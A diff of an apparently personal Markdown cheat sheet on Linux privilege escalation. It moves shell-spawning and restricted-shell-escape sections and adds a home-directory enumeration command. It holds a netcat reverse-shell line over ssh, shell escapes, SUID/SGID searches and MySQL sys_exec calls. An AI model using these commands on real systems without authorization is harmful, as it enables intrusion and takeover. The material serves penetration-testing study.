@@ -1,32 +1,12 @@
 # Linux privilege escalation
-### Spawn Interactive Shell and set env  
-
-python -c 'import pty;pty.spawn("/bin/bash");'  
-ctrl z  
-echo $TERM  
-stty -a  
-stty raw -echo  
-fg  
-
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
-export TERM=xterm256-color  
-export SHELL=bash  
-
-stty rows \<> colums \<>  
-
-### Restricted bash
-perl -e 'exec "/bin/sh";'  
-/bin/sh -i  
-exec "/bin/sh";  
-echo os.system('/bin/bash')  
-/bin/sh -i  
-ssh user@$ip nc $localip 4444 -e /bin/sh  
-export TERM=linux  
 
 ### Check environment 
 
-Search permissions command(Please remember):
+Search permissions command(Please remember):        
 /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+Getting use info:       
+find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
 
 Check any restricitions on any folders  
 mount -l        >> any no exec or no suid?  
@@ -136,4 +116,26 @@ https://www.exploit-db.com/exploits/1518/
 You can also try
 select sys_exec('echo test>/tmp/test.txt');
 select sys_eval('echo test>/tmp/test.txt');
+### Spawn Interactive Shell and set env  
 
+python -c 'import pty;pty.spawn("/bin/bash");'  
+ctrl z  
+echo $TERM  
+stty -a  
+stty raw -echo  
+fg  
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
+export TERM=xterm256-color  
+export SHELL=bash  
+
+stty rows \<> colums \<>  
+
+### Restricted bash
+perl -e 'exec "/bin/sh";'  
+/bin/sh -i  
+exec "/bin/sh";  
+echo os.system('/bin/bash')  
+/bin/sh -i  
+ssh user@$ip nc $localip 4444 -e /bin/sh  
+export TERM=linux  
